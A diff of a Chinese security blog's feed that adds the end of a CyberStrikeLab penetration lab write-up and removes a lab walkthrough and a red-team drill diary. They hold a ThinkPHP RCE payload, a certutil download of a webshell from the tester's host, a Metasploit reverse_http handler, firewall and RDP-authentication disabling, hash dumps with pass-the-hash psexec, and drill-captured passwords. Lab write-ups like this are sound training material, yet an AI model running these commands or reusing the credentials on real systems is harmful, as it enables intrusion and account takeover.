+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303165436865.png" class title="image-20250303165436865">
+
+<p>运行时注意管理员身份运行</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173105964.png" class title="image-20250303173105964">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303165555703.png" class title="image-20250303165555703">
+
+<p>获取 hash</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173046901.png" class title="image-20250303173046901">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::</span><br><span class="line">cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::</span><br><span class="line">abcc:1106:aad3b435b51404eeaad3b435b51404ee:73f5d97549f033374fa6d9f9ce247ffd:::</span><br><span class="line">WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:a0cde4eb68e4a2345b888c83eed3b196:::</span><br><span class="line">CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:fba62b6152431813b79b5e71c41b16d0:::</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 -q python3 psexec.py -hashes :94bd5248e87cb7f2f9b871d40c903927 cyberstrikelab.com/administrator@192.168.20.20</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173617800.png" class title="image-20250303173617800">
+
+<p>拿到最后的旗帜</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173712105.png" class title="image-20250303173712105">
+]]></content>
+      <categories>
+        <category>靶机系列</category>
+        <category>CyberStrikeLab</category>
+      </categories>
+      <tags>
+        <tag>综合渗透靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2024强网杯部分Web复现</title>
     <url>/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="2024-强网杯-platform"><a href="#2024-强网杯-platform" class="headerlink" title="[2024 强网杯]platform"></a>[2024 强网杯]platform</h2><p><strong>考点：Session反序列化、字符串溢出减少</strong></p>
+    <content><![CDATA[<h1 id="2024-强网杯-platform"><a href="#2024-强网杯-platform" class="headerlink" title="[2024 强网杯]platform"></a>[2024 强网杯]platform</h1><p><strong>考点：Session反序列化、字符串溢出减少</strong></p>
 <p>扫描目录得到源码</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www.zip</span><br></pre></td></tr></table></figure></div>
 
@@ -137,7 +478,7 @@
 
 
 
-<h2 id="2024-强网杯-PyBlockly"><a href="#2024-强网杯-PyBlockly" class="headerlink" title="[2024 强网杯]PyBlockly"></a>[2024 强网杯]PyBlockly</h2><p><strong>考点：len 函数重定义与命令注入、字符编码绕过、SUID 提权</strong> </p>
+<h1 id="2024-强网杯-PyBlockly"><a href="#2024-强网杯-PyBlockly" class="headerlink" title="[2024 强网杯]PyBlockly"></a>[2024 强网杯]PyBlockly</h1><p><strong>考点：len 函数重定义与命令注入、字符编码绕过、SUID 提权</strong> </p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107161833137.png" class title="image-20241107161833137">
 
 <p>根目录服务为 JS Blockly 积木块，当拼接积木然后 <code>send</code> 发送时，会发送一个 JSON 数据，如发送 <code>1111</code> </p>
@@ -212,349 +553,10 @@
       </tags>
   </entry>
   <entry>
-    <title>2024市护小记</title>
-    <url>/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/</url>
-    <content><![CDATA[<p>年前参与市护，第一次并在攻防演练取得战果，仅做记录</p>
-<h2 id="两台云主机"><a href="#两台云主机" class="headerlink" title="两台云主机"></a>两台云主机</h2><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>入口点</p>
-<p>公网通过某系统通用弱口令拿到 Web 网站</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101950101.png" class title="image-20250306101950101">
-
-<p>翻阅站点，发现一处文件上传接口，简单绕过一下防护就上传成功</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305212110280.png" class title="image-20250305212110280">
-
-<p>上传 aspx 马，连接失败，判断应该是被 Defender 拦了解析失败，后续进入系统发现没杀软</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305212721356.png" class title="image-20250305212721356">
-
-<p>通过工具制作免杀马再次上传，连接成功</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213007147.png" class title="image-20250305213007147">
-
-<p>上线CS</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213356723.png" class title="image-20250305213356723">
-
-<p>提权至系统最高权限</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213447863.png" class title="image-20250305213447863">
-
-<p>对内网进行侦察，带一带扫描，可惜没有发现其他主机</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305214606906.png" class title="image-20250305214606906">
-
-<p>权限级已经至顶，拿下 3389 远程桌面</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305214832698.png" class title="image-20250305214832698">
-
-<p>还有数据库，忘记截图，只是一台云主机，没有内网，遗憾收手。</p>
-<h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>主页</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101737191.png" class title="image-20250306101737191">
-
-<p>发现该系统存在 Structs2-016，工具利用，拿下该系统</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305215704469.png" class title="image-20250305215704469">
-
-<p>文件浏览</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220135346.png" class title="image-20250305220135346">
-
-<p>拿到 SQLServer 管理员账号密码</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.username=sa</span><br><span class="line">db.password=jack_2014</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220337734.png" class title="image-20250305220337734">
-
-
-
-
-
-<h2 id="某网关"><a href="#某网关" class="headerlink" title="某网关"></a>某网关</h2><p>某网关存在命令执行漏洞，通过漏洞拿到 Shell，且执行权限直接为 root</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x:8443/webui/.xxx.php   密码：cmd</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220723939.png" class title="image-20250305220723939">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220744648.png" class title="image-20250305220744648">
-
-<h3 id="双网卡主机，突破逻辑隔离"><a href="#双网卡主机，突破逻辑隔离" class="headerlink" title="双网卡主机，突破逻辑隔离"></a>双网卡主机，突破逻辑隔离</h3><p>突破逻辑隔离，拿到双网卡主机，进入核心业务区之后就是酷酷乱扫，小企业的内网比较脆弱</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306100910479.png" class title="image-20250306100910479">
-
-<h3 id="内网沦陷，二十台主机权限"><a href="#内网沦陷，二十台主机权限" class="headerlink" title="内网沦陷，二十台主机权限"></a>内网沦陷，二十台主机权限</h3><p>后面数量过多，就放一张图片好了</p>
-<p><strong>两台远程桌面</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.200 Administrator Admin12345</span><br><span class="line">192.168.0.123 Administrator Admin123</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101022986.png" class title="image-20250306101022986">
-
-<p><strong>5 x SSH 连接</strong> </p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSH:192.168.10.252:22:root 123456</span><br><span class="line">SSH:192.168.0.207:22:admin admin</span><br><span class="line">SSH:192.168.0.206:22:admin password</span><br><span class="line">SSH:192.168.0.205:22:admin password</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305221454516.png" class title="image-20250305221454516">
-
-<p><strong>13 x 永恒之蓝</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.60.145      MS17-010        (Windows 5.1)</span><br><span class="line">192.168.60.55       MS17-010        (Windows 5.1)</span><br><span class="line">192.168.60.168      MS17-010        (Windows 5.1)</span><br><span class="line">192.168.80.89       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.0.230       MS17-010        (Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">192.168.60.84       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.20.24       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.20.112      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.60.53       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.80.128      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.0.250       MS17-010        (Windows Server 2008 R2 Enterprise 7600)</span><br><span class="line">192.168.60.188      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.100.208     MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101129833.png" class title="image-20250306101129833">
-
-<p>FTP 服务器</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://192.168.0.123:21:anonymous</span><br><span class="line">   8uftp_V3.8.2.0_setup.1419410889.exe</span><br><span class="line">ftp://192.168.10.60:21:anonymous</span><br><span class="line">ftp://192.168.60.197:21:anonymous</span><br><span class="line">ftp://192.168.60.115:21:anonymous</span><br><span class="line">ftp://192.168.60.105:21:anonymous</span><br><span class="line">ftp://192.168.60.124:21:anonymous</span><br><span class="line">ftp://192.168.60.155:21:anonymous</span><br><span class="line">ftp://192.168.60.75:21:anonymous</span><br><span class="line">ftp://192.168.60.103:21:anonymous</span><br><span class="line">ftp://192.168.0.88:21:anonymous</span><br><span class="line">ftp://192.168.0.215:21:anonymous</span><br><span class="line">ftp://192.168.60.123:21:anonymous</span><br><span class="line">ftp://192.168.60.129:21:anonymous</span><br><span class="line">ftp://192.168.60.10:21:anonymous</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101144326.png" class title="image-20250306101144326">
-
-<p>MYSQL 数据库</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql:192.168.0.123:3306:root 123</span><br><span class="line">mssql:192.168.0.236:1433:sa 123</span><br><span class="line">mysql:192.168.0.200:3306:root 123</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101306256.png" class title="image-20250306101306256">
-
-
-
-<h2 id="帆软反序列化RCE-主机权限"><a href="#帆软反序列化RCE-主机权限" class="headerlink" title="帆软反序列化RCE 主机权限"></a>帆软反序列化RCE 主机权限</h2><p>后面还发现一个存在帆软反序列化 RCE 漏洞的系统，直接 root，可惜已经没时间进内网了</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101512096.png" class title="image-20250306101512096">
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>攻防演练</category>
-      </categories>
-      <tags>
-        <tag>攻防</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CyberStrikeLab - lab1</title>
-    <url>/2025/03/05/CyberStrikeLab-lab1/</url>
-    <content><![CDATA[<p>目标：本次小李的任务是攻克 192.168.10.0&#x2F;24 网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象中的复杂。</p>
-<h2 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h2><img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302122910501.png" class title="image-20250302122910501">
-
-<p>使用 fscan 对 192.168.10.* 网段进行存活、端口及漏洞扫描，检测出了 thinkphp5023 漏洞</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228114857535.png" class title="image-20250228114857535">
-
-<p>站点如下</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115021823.png" class title="image-20250228115021823">
-
-
-
-<h2 id="边界突破-192-168-10-10"><a href="#边界突破-192-168-10-10" class="headerlink" title="边界突破 - 192.168.10.10"></a>边界突破 - 192.168.10.10</h2><h3 id="ThinkPHP-5-0-23-RCE"><a href="#ThinkPHP-5-0-23-RCE" class="headerlink" title="ThinkPHP 5.0.23 RCE"></a>ThinkPHP 5.0.23 RCE</h3><p><strong>工具库利用</strong></p>
-<p>使用 ThinkPHP 漏洞扫描工具进行历史漏洞扫描，发现大量 thinphp nday 都能打通</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115120674.png" class title="image-20250228115120674">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115129755.png" class title="image-20250228115129755">
-
-<p>上传一句话木马文件</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115200680.png" class title="image-20250228115200680">
-
-<p>蚁剑连接成功</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115226573.png" class title="image-20250228115226573">
-
-<p><strong>手工利用</strong></p>
-<p>再换一种手工利用的手法</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:  http://192.168.10.10/?s=captcha&amp;test=-1</span><br><span class="line">POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure></div>
-
-<p>执行有一瞬间出现命令执行结果，然后跳转至 404 页面</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100619418.png" class title="image-20250302100619418">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100642312.png" class title="image-20250302100642312">
-
-<p>接下来手工利用反弹 shell，nc 开启 22222 Port</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302100936292.png" class title="image-20250302100936292">
-
-<p>生成 powershell 反弹命令，IP 选择 OpenVPN 分配的 IP 172.16.233.2</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101132647.png" class title="image-20250302101132647">
-
-<p>Base64 编码并执行，注意关闭防火墙或设置防火墙配置</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101207302.png" class title="image-20250302101207302">
-
-<p>成功得到 Shell</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302101308073.png" class title="image-20250302101308073">
-
-<p>直接 &gt; 写入一句话木马发现每个字符间存在空字节，导致 PHP 解析错误；</p>
-<p>系统内有 certutil，使用其下载本地准备好的一句话木马</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302103707223.png" class title="image-20250302103707223">
-
-<p>本地开启 python web服务</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104258607.png" class title="image-20250302104258607">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://172.16.233.2:22223/1.php</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104348794.png" class title="image-20250302104348794">
-
-<p>一句话木马文件下载在网站根目录，蚁剑连接，成功</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104244291.png" class title="image-20250302104244291">
-
-<p>C 盘根目录拿下旗帜一</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302104554321.png" class title="image-20250302104554321">
-
-<p><strong>上线 CS</strong></p>
-<p>上传 CS 木马并执行</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114942426.png" class title="image-20250302114942426">
-
-<p>机器上线成功</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302115031318.png" class title="image-20250302115031318">
-
-<p>禁用防火墙</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off 	//关闭所有防火墙，winsows server 2003 之后</span><br><span class="line">netsh advfirewall show allprofiles   //查询域、私有、共有防火墙状态</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302115723132.png" class title="image-20250302115723132">
-
-
-
-<h3 id="3389-远程桌面连接"><a href="#3389-远程桌面连接" class="headerlink" title="3389 远程桌面连接"></a>3389 远程桌面连接</h3><p>开启 3389 端口</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105830463.png" class title="image-20250302105830463">
-
-<p>添加自定义用户</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user abcc 123@abc /add</span><br><span class="line">net localgroup Administrators abcc /add</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105810303.png" class title="image-20250302105810303">
-
-<p>尝试远程桌面连接</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105950985.png" class title="image-20250302105950985">
-
-<p>身份证验证导致的错误，直接禁用掉身份证验证</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302110101538.png" class title="image-20250302110101538">
-
-<p>再次尝试，成功登录</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111506571.png" class title="image-20250302111506571">
-
-<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>翻阅 phpstudy，找到数据库用户名密码</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">root/cyberstrike@2024</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111740743.png" class title="image-20250302111740743">
-
-<p>尝试使用 phpstudy 文件 mysql.exe 登录数据库，失败</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113247646.png" class title="image-20250302113247646">
-
-<p>phpstudy 中MYSQL并没有开启，尝试直接点击启动，会马上跳回关闭，启动失败</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113617815.png" class title="image-20250302113617815">
-
-<p>很奇怪的状态，对方是有 3306 端口使用的，我尝试查看当前 mysql 状态</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc query mysql</span><br></pre></td></tr></table></figure></div>
-
-<p>state: 1 stopped，当前 mysql 并没有开启</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302113532666.png" class title="image-20250302113532666">
-
-<p>接下来登录管理员命令行开启 mysql，Windows Server 2012R2 环境较老，win + R 在运行启用管理员命令行失败。打开任务管理器，点击文件，运行新任务，勾选以系统管理权限创建此任务，确定。</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114148322.png" class title="image-20250302114148322">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114219492.png" class title="image-20250302114219492">
-
-<p>启动 mysql 服务</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114304781.png" class title="image-20250302114304781">
-
-<p>再次尝试连接 MySQL，登录成功</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114337558.png" class title="image-20250302114337558">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302114613073.png" class title="image-20250302114613073">
-
-<p>创建一个允许远程连接的用户并给予足够权限</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;aabbcc&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;aabbcc&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;aabbcc&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302130321863.png" class title="image-20250302130321863">
-
-<p>拿下数据库</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302130419465.png" class title="image-20250302130419465">
-
-
-
-<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>外网机器是双网卡，目标内网还有一个 192.168.20.X 网段</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302190303722.png" class title="image-20250302190303722">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303105119541.png" class title="image-20250303105119541">
-
-<p><strong>Fscan 扫描</strong> </p>
-<p>使用 fscan 对 20 段进行扫描</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.20.0/24</span><br></pre></td></tr></table></figure></div>
-
-<p>发现 20 和 30 都有永恒之蓝漏洞</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.20.20:139 open</span><br><span class="line">192.168.20.10:139 open</span><br><span class="line">192.168.20.10:3306 open</span><br><span class="line">192.168.20.30:445 open</span><br><span class="line">192.168.20.20:445 open</span><br><span class="line">192.168.20.10:445 open</span><br><span class="line">192.168.20.30:139 open</span><br><span class="line">192.168.20.30:135 open</span><br><span class="line">192.168.20.20:135 open</span><br><span class="line">192.168.20.10:80 open</span><br><span class="line">192.168.20.30:88 open</span><br><span class="line">192.168.20.10:135 open</span><br><span class="line">[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetBios 192.168.20.10   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.20</span><br><span class="line">   [-&gt;]cyberweb</span><br><span class="line">   [-&gt;]192.168.20.20</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.30</span><br><span class="line">   [-&gt;]WIN-7NRTJO59O7N</span><br><span class="line">   [-&gt;]192.168.20.30</span><br><span class="line">[+] MS17-010 192.168.20.20	(Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[+] MS17-010 192.168.20.30	(Windows Server 2008 R2 Standard 7600)</span><br><span class="line">[*] WebTitle http://192.168.20.10      code:200 len:25229  title:易优CMS -  Powered by Eyoucms.com</span><br><span class="line">[+] PocScan http://192.168.20.10 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h3><p><strong>CS 派发 MSF 会话</strong>，先开启MSF</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 172.16.233.2</span><br><span class="line">set LPORT 4777</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>CS 启动监听，配置与 MSF 一致</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303122413992.png" class title="image-20250303122413992">
-
-<p>选择 192.168.10.10 会话，spawn 选择刚配置的监听，点击 Choose，MSF 成功接收到 CS 的会话</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303122832054.png" class title="image-20250303122832054">
-
-<p>MSF 配置路由</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.20.0/24</span><br><span class="line">run autoroute -p  //观测路由是否添加成功</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303123219982.png" class title="image-20250303123219982">
-
-<p>MSF 设置 Socks 代理</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">search socks || use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 172.16.233.2</span><br><span class="line">run</span><br><span class="line">sudo vi /etc/proxychains4.conf  //修改配置文件和选项设置的一致，且注意sock4、sock5一致</span><br></pre></td></tr></table></figure></div>
-
